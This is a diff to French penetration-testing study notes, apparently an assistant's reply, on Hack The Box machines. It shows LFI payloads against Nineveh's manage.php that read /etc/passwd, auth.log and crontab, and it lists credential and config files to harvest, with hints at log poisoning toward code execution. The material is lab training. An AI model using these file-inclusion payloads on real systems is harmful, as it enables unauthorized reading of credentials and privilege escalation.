@@ -114,3 +114,30 @@ Networked → Timing → Pikaboo
 ```
 
 Networked est la prochaine étape logique — file upload + LFI, technique que tu n'as pas encore faite proprement.
+Oui exactement.
+
+Une fois la LFI validée avec `/etc/passwd`, tu utilises le même paramètre pour lire tous ces fichiers.
+
+Exemple concret sur Nineveh :
+```
+manage.php?notes=/etc/passwd/nineveh
+manage.php?notes=/var/log/auth.log/nineveh
+manage.php?notes=/etc/crontab/nineveh
+```
+
+**Pourquoi c'est utile :**
+
+```
+/etc/passwd        → liste des users, leurs shells
+/etc/crontab       → crons root = vecteur privesc
+/var/log/auth.log  → log poisoning SSH possible ?
+/etc/ssh/sshd_config → SSH autorisé ? clés acceptées ?
+/var/www/html/config.php → credentials base de données
+/proc/self/environ → variables d'env + User-Agent injectable
+```
+
+**Réflexe à avoir :**
+
+Dès que tu valides une LFI → parcourir ces chemins systématiquement avant de chercher un vecteur RCE. Les configs et logs te donnent souvent des credentials ou des vecteurs d'escalade directement.
+
+Tu veux qu'on intègre ça dans ta checklist post-LFI ?
